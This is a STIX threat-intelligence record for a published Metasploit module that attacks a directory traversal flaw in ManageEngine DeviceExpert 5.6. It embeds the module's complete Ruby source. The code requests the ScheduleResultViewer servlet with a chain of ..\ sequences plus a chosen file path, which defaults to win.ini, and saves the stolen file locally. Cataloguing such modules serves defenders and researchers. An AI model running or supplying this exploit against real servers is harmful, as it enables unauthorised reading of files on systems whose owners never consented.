{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cef0a89a-7f5d-4d6c-ad97-ab46e2071b6f",
    "created": "2024-08-14T16:30:23.776594Z",
    "modified": "2024-08-14T16:30:23.776598Z",
    "name": "ManageEngine DeviceExpert 5.6 ScheduleResultViewer FileName Traversal",
    "description": " This module exploits a directory traversal vulnerability found in ManageEngine DeviceExpert's ScheduleResultViewer Servlet.  This is done by using \"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\\" in the path in order to retrieve a file on a vulnerable machine.  Please note that the SSL option is required in order to send HTTP requests.  'References'     => [ [ 'OSVDB', '80262'] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/manageengine_deviceexpert_traversal.rb",
            "external_id": "manageengine_deviceexpert_traversal.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ManageEngine DeviceExpert 5.6 ScheduleResultViewer FileName Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability found in ManageEngine\n        DeviceExpert's ScheduleResultViewer Servlet.  This is done by using\n        \"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\\" in the path in order to retrieve a file on a\n        vulnerable machine.  Please note that the SSL option is required in order to send\n        HTTP requests.\n      },\n      'References'     =>\n        [\n          [ 'OSVDB', '80262']\n        ],\n      'Author'         =>\n        [\n          'rgod',   #Discovery\n          'sinn3r'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2012-03-18'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(6060),\n        OptBool.new('SSL',   [true, 'Use SSL', true]),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', 'windows\\\\win.ini'])\n      ])\n  end\n\n  def run_host(ip)\n    traverse = \"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\\"\n    filename = datastore['FILEPATH']\n\n    res = send_request_raw({\n      'uri' => \"/scheduleresult.de\",\n      'method' => 'GET'\n    }, 25)\n\n    if res && res.code != 200\n      print_error(\"Target is not ManageEngine DeviceExpert\")\n      return\n    end\n\n    res = send_request_raw({\n      'uri' => \"/scheduleresult.de/?FileName=#{traverse}#{filename}\",\n      'method' => 'GET'\n    }, 25)\n\n    if res\n      case res.code\n      when 200\n        print_status(\"#{ip}:#{rport} returns: #{res.code.to_s}\")\n      when 404\n        print_error(\"#{ip}:#{rport} - file not found\")\n        return\n      end\n    else\n      print_error(\"Unable to communicate with #{ip}:#{rport}\")\n      return\n    end\n\n    if res.body.empty?\n      print_error(\"#{ip}:#{rport} - no file downloaded (empty)\")\n    else\n      fname = File.basename(datastore['FILEPATH'])\n      path = store_loot(\n        'manageengine.http',\n        'application/octet-stream',\n        ip,\n        res.body,\n        fname)\n\n      print_good(\"#{ip}:#{rport} - File saved in: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-03-18"
}